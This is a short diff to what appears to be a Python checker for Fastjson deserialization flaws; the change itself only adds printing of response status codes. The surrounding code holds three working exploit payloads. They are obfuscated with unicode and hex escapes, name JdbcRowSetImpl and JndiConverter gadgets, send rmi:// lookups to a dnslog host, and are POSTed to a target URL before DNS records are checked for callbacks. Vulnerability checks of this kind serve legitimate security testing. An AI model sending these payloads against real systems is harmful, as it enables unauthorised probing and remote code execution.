@@ -18,9 +18,12 @@ def check(vul_url):
     payload_1 = '{"a": {"\u0040\x74\u0079p\x65": "\u006a\u0061\x76a.\x6c\u0061\u006eg.C\u006c\u0061\u0073\x73","val": "\u0063om\x2Esu\u006E\u002Er\u006F\u0077\u0073e\x74.Jdbc\u0052\x6Fw\x53\x65t\u0049\u006D\x70\u006C"},"b": {"@\x74\u0079p\x65": "\u0063om\x2Esu\u006E\u002Er\u006F\u0077\u0073e\x74.Jdbc\u0052\x6Fw\x53\x65t\u0049\u006D\x70\u006C","dataSourceName": "rmi://poc1.' + dnslog +'/Object","autoCommit": true}}'
     payload_2 = '{"a": {"\u0040\x74\u0079p\x65": "Lcom\u002E\u0073u\u006E.\x72o\u0077\u0073e\u0074\x2E\x4Ad\x62\x63\u0052\x6F\x77\u0053\u0065\x74I\u006D\u0070l;","dataSourceName": "rmi://poc2.' + dnslog + '/Object","autoCommit": true}}'
     payload_3 = '{"a": {"\u0040\x74\u0079p\x65": "\u006F\u0072\x67.\x61p\u0061\x63\u0068\x65\u002E\u0078\u0062ea\x6E\u002E\x70\u0072o\x70\x65\x72t\u0079ed\x69\x74or\u002EJ\x6Ed\u0069Con\x76e\x72\u0074e\x72","AsText": "rmi://poc3.' + dnslog + '/Object"}}'
-    rsp1 = requests.post(url=vul_url, data=payload_1, headers=headers, verify=False, timeout=5)
-    rsp2 = requests.post(url=vul_url, data=payload_2, headers=headers, verify=False, timeout=5)
-    rsp3 = requests.post(url=vul_url, data=payload_3, headers=headers, verify=False, timeout=5)
+    rsp1 = requests.post(url=vul_url, data=payload_1, headers=headers, verify=False, timeout=5).status_code
+    print('[+] payload_1 status: ' + str(rsp1))
+    rsp2 = requests.post(url=vul_url, data=payload_2, headers=headers, verify=False, timeout=5).status_code
+    print('[+] payload_2 status: ' + str(rsp2))
+    rsp3 = requests.post(url=vul_url, data=payload_3, headers=headers, verify=False, timeout=5).status_code
+    print('[+] payload_3 status: ' + str(rsp3))
     print('[+] payload send completed, get dns records ...\n')
     print('-----------------------------------------------')
     rspdns = requests.get(url='http://www.dnslog.cn/getrecords.php', cookies=cookies).text
